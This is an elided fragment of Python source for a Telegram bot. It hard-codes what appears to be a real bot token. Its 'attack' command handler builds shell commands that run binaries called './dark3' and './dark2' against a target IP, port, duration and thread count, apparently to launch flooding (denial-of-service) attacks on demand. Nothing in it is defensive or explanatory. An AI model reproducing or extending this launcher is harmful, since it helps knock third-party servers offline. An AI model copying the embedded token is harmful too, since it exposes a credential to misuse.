...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7918989887:AAF45AYUcdBJenLuaFazCky1mFarbhBjwmA'
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./dark3 {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./dark2 {ip} {port} {duration} {threads}"
